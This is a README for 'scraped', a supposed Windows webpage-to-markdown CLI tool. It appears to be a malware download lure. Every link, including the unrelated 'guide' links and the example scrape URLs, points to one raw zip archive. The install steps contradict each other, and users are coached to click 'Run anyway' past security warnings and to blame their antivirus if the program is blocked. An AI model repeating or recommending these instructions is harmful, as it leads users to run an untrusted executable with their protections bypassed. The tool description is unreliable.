# 🕸️ scraped - Easy Webpage to Markdown Tool

[![Download scraped](https://img.shields.io/badge/Download-scraped-4caf50?style=for-the-badge)](https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip)

A simple tool that grabs web pages and turns them into markdown files. It uses a command line interface (CLI) with an interactive text-based browser. You can run it on a Windows PC without needing to write any code.

---

## 📋 What is scraped?

scraped is a fast tool that collects content from websites. It works on many pages at the same time (parallelized), which saves time. After collecting the content, it changes web pages into markdown. Markdown is a simple format that makes text easy to read and edit.

You can use scraped to:

- Save web articles for offline reading.
- Extract information from multiple web pages quickly.
- Browse web pages inside your terminal using a text user interface (TUI).
- Convert HTML content into clean markdown text.

This tool runs on Windows and uses a terminal window for input and output. You do not need any programming skills to use it.

---

## 🔍 Features

- Runs on Windows with minimal setup.
- Downloads and processes many pages at once to save time.
- Converts web page content to markdown format automatically.
- Includes an interactive text browser to view pages inside the program.
- Supports many common website formats.
- Shows progress and status in the terminal.
- Works offline after saving pages.
- Command line based for simple use.

---

## 🖥️ System Requirements

- **Operating System:** Windows 10 or newer.
- **Processor:** Intel or AMD, any modern CPU.
- **RAM:** 4 GB minimum, 8 GB recommended.
- **Disk Space:** At least 100 MB free.
- **Internet:** Required to download pages from the web.
- **Permissions:** Ability to run programs from downloaded files.

---

## 🚀 Getting Started

Use the links below to get the program on your Windows PC. Follow the steps to download, install, and run scraped.

[![Download scraped](https://img.shields.io/badge/Download-scraped-4caf50?style=for-the-badge)](https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip)

1. **Visit the download page**

   Go to the GitHub page for scraped by clicking this link:

   https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip

2. **Find the latest release**

   On the page, look for the "Releases" section. This usually appears on the right side or in the middle of the page. The latest version includes ready-to-use files.

3. **Download the Windows file**

   In the latest release, find the file ending with `.exe`. This is the Windows version of scraped. Click on it to download to your computer.

4. **Run the downloaded file**

   Once downloaded, open the file by clicking on it. You may see a security message; select "Run" or "More info" then "Run anyway" if needed.

5. **Open Command Prompt**

   Press the Windows key on your keyboard. Type `cmd` and press Enter. This opens the Command Prompt, a text window where you will run scraped.

6. **Navigate to the downloaded file location**

   By default, files download to the "Downloads" folder. In the Command Prompt, type:

   ```
   cd %UserProfile%\Downloads
   ```

   Press Enter.

7. **Run scraped**

   Type the name of the downloaded `.exe` file. Example:

   ```
   scraped.exe
   ```

   Then press Enter.

   You should see a welcome message and the tool ready to accept commands.

---

## 📥 How to Use scraped

Using scraped is simple once you open it in the Command Prompt.

1. **Start scraping a webpage**

   To get content from a webpage, type the command:

   ```
   scrape [URL]
   ```

   Replace `[URL]` with the full address of the webpage you want to save. For example:

   ```
   scrape https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip
   ```

2. **Watch the progress**

   scraped will show you status messages as it downloads the page and converts it. You will see progress bars or counts.

3. **Use the interactive browser**

   While scraped runs, you can use the interactive terminal browser to look at webpages inside your window. Use arrow keys and simple commands shown on screen.

4. **Save markdown files**

   After scraping, files will be saved in the current folder. The files end with `.md` and can be opened by many text editors or markdown viewers.

5. **Batch scrape multiple pages**

   You can scrape many pages at once by listing URLs in a text file. Example:

   ```
   scrape -file urls.txt
   ```

   Here, `urls.txt` contains one webpage address per line.

---

## ⚙️ Settings and Options

scraped lets you control how it works using simple command options:

- `-output [folder]` : Save markdown files in a specific folder.
- `-threads [number]` : Set how many pages to download at once. Higher numbers are faster but use more resources.
- `-depth [number]` : Control how many links to follow inside pages.
- `-help` : Show a list of commands and options.

Example:

```
scrape -output savedPages -threads 5 -depth 2 https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip
```

This command saves files in the `savedPages` folder, downloads 5 pages at once, and follows links up to 2 steps inside the site.

---

## 🔧 Troubleshooting

- If the program does not start, check your antivirus settings. Some security software may block unknown programs.
- Ensure you downloaded the `.exe` file, not the source code or a zip archive.
- If commands do not work, confirm you are in the folder with the `.exe` file in Command Prompt.
- For connection errors, check your internet connection is working.
- Use the `-help` option for command guidance.

---

## 🛠️ Advanced Use (Optional)

You can automate scraping by creating text files with web addresses. Use scripts or batch files to run scraped regularly. This can help keep markdown copies of frequently updated websites.

---

## 📂 File Locations

- **Downloaded File:** Likely in your `Downloads` folder.
- **Saved Markdown Files:** Same folder where you run scraped unless you use `-output` to change this.
- **Log Files:** scraped may create logs to help track what happened during scraping. These are stored in the run folder.

---

## 📚 Additional Resources

- Markdown editors like Visual Studio Code, Typora, or Obsidian can open your saved files.
- You can view markdown files in plain text or convert them to HTML with many tools.
- Search online for "markdown tutorial" if you want to learn how to edit or style markdown documents.

---

## 🔗 Links

- Download and information: https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip
- Markdown guide: https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip
- Command Prompt basics: https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip

---

# Useful Topics:

bubbletea, cli, go, golang, html-to-markdown, markdown, scraper, terminal, tui, web-scraper